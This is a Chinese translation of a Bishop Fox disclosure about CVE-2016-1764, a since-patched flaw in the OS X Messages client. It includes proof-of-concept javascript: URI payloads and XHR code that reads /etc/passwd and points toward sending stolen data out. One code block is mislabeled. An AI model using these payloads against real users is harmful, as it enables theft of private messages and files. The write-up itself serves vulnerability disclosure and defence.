> 原文链接: https://www.anquanke.com//post/id/83755 


# 从客户端中恢复iMessage明文信息


                                阅读量   
                                **88972**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/](https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a90b3106dc13ecc4.png)](https://p1.ssl.qhimg.com/t01a90b3106dc13ecc4.png)

2016年3月份,苹果公司正式宣布漏洞CVE-2016-1764已经成功修复。该漏洞是一个应用层漏洞,攻击者可以利用这个存在于OS X系统短信客户端中的漏洞来获取到邮件中所有文字内容和附件内容的明文数据。与之相反,相较于攻击iMessage的传输协议,利用这个漏洞来进行攻击则更加的简单。与此同时,攻击者既不需要对数学知识有非常深入的研究,而且也不需要对计算机系统的内存管理方式和shellcode等内容有任何了解,攻击者只需要了解一些关于JavaScript的基础知识,就可以利用这个漏洞来实施攻击了。

**技术综述**

iMessage是苹果公司推出的即时通信软件,可以发送短信、视频和附件等内容,其拥有非常高的安全性。iMessage不同于运营商短信/彩信业务,用户仅需要通过WiFi或者蜂窝数据网络进行数据支持,就可以完成数据通信。iMessage利用了iOS和Mac OS中最新的消息提醒系统,可以将信息直接推送到对方的屏幕上,而不管对方是在游戏还是锁屏状态。如果双方都在使用iMessage,你甚至可以看到对方正在输入的状态。

除此之外,OS X中的iMessage会将消息中所有的URI地址转换成HTML中的&lt;a href=”URI”&gt;链接。这样一来,攻击者就可以创建一个简单的JavaScript URI来欺骗用户去点击它,当用户点击了这条恶意链接之后,攻击者的代码(跨站脚本)便会执行。

虽然OS X中的iMessage使用的是嵌入式的WebKit库,但是攻击者仍然可以利用XMLHttpRequest(XHR) GET请求(file://URI)来读取到任意文件的内容,这是因为其中却少同源策略(SOP)。攻击者不仅可以利用XHR来读取任意文件,而且还可以将目标用户的聊天记录和附件文件上传至远程服务器中,传输速度完全取决于目标用户的网络带宽。

在整个攻击过程中,唯一需要的用户交互行为就是点击那个恶意URL地址。除此之外,如果目标用户在Mac中开启了短信同步功能,攻击者就可以利用计算机来获取到目标用户iPhone手机发送或接收到的所有短信消息。

如果大家想了解更多的细节信息,请继续阅读这篇文章。

**技术细节**

OS X中的短信机制

OS X中的短信消息依赖于内嵌的WebKit,并以HTML来作为用户接口。当系统接收或发送短信时,系统会将HTML内容插入DOM之中,然后再在图形界面中显示出文字或附件内容。

当我们对OS X中的iMessage客户端进行了分析和测试之后,我们发现了下图所示的URI链接,这些地址都将会被插入至WebView之中:



```
test://test
smb://test@test.com
file:///etc
anyurihandler://anycontentafter
```

由于OS X中的短信客户端没有设置可用协议的白名单,这也就意味着攻击者可以向目标用户发送一个包含有JavaScript代码的短信,系统将会把JS代码转换成可点击的地址形式呈现给目标用户。

当用户点击了这条链接之后,内嵌的WebKit将会执行攻击者提供的JavaScript代码,示例如下图所示:

[![](https://p5.ssl.qhimg.com/t01773446bcb2ed81cb.png)](https://p5.ssl.qhimg.com/t01773446bcb2ed81cb.png)

需要注意的是,代码中的“%0a”是为了防止其被JavaScript的注释符“//”注释掉。当这段代码被解释执行之后,将会变成下面这种形式:



```
//bishopfox.com/research?
prompt(1)
```

当点击了这条地址之后,OS X的短信客户端将会被激活:

[![](https://p2.ssl.qhimg.com/t010a4eebbe5d36490c.png)](https://p2.ssl.qhimg.com/t010a4eebbe5d36490c.png)

但是,OS X的短息客户端是桌面应用程序,并不是一个web网页。因此,JavaScript代码需要以applewebdata://origin的形式来运行:

[![](https://p3.ssl.qhimg.com/t01337b0f79cb85ce36.png)](https://p3.ssl.qhimg.com/t01337b0f79cb85ce36.png)

读取文件

OS X中的短信客户端可以执行下列代码,并读取/etc/passwd文件中的内容:



```
function reqListener ()
`{`  prompt(this.responseText);
// send back to attacker’s server here
`}`
var oReq = new XMLHttpRequest();
oReq.addEventListener("load", reqListener);
oReq.open("GET", "file:///etc/passwd");
oReq.send();
```

当系统将上述内容转换成了URI payload之后,代码将会变成下面这种形式:

```
//bishopfox.com/research?%0d%0afunction%20reqListener%20()%20%7B%0A%20%20prompt(this.responseText)%3B%0A%7D%0Avar%20oReq%20%3D%20new%20XMLHttpRequest()%3B%0AoReq.addEventListener(%22load%22%2C%20reqListener)%3B%0AoReq.open(%22GET%22%2C%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22)%3B%0AoReq.send()%3B
```

如果用户在短信客户端中点击了这个链接,那么程序界面将会变成如下图所示的情况:

[![](https://p0.ssl.qhimg.com/t01b3e6f30373d3f32e.png)](https://p0.ssl.qhimg.com/t01b3e6f30373d3f32e.png)

注入至应用程序DOM中的JS代码如下所示:

```
/Users/&lt;username&gt;/Library/Messages/*
```

这些信息中的文字内容和其他的一些元数据将会被存储至SQLite数据库中,数据库的存储地址如下:



```
/Users/&lt;username&gt;/Library/Messages/*
```

在这个数据库中,还包含目标用户计算机中所有附件的存放地址。但是,如果攻击者想要获取到这些数据的话,还需要使用到更加高级的攻击技术。

**对于开发者而言,JavaScript无处不在**

现在,客户端的内容注入漏洞已经不仅限于浏览器之中了。对于开发者来说,类似WebKit和nw.js这样的技术可以帮助他们很大程度地加快程序的开发进度,但是如果直接使用这些代码库,往往会影响应用程序的安全性。很明显,嵌入式的web应用框架中肯定是存在漏洞的,例如跨站脚本(XSS)等。随着攻击技术的不断发展,攻击者将来还有可能利用这些漏洞来进行破坏性更大的攻击。

这个漏洞也足以证明URI是多么的强大。对于那些完全对此不了解的用户而言,URI可能就是一个能够帮助他们链接到某个网站的工具,但是这只是它的其中一个功能。在这个复杂多变的网络环境中,它的功能远远不止这些。就像电子邮件中的附件一样,现在很多用户已经逐步开始意识到在点击这些文件之前,需要确定这个附件是否安全。而可点击的链接地址也是如此,用户只有在确定了这条地址的来源是否可信任之后,再去点击它。

在此,我们要感谢苹果公司在整个过程中与我们进行了非常积极的沟通与合作,并且在最短的时间里修复了这个漏洞。
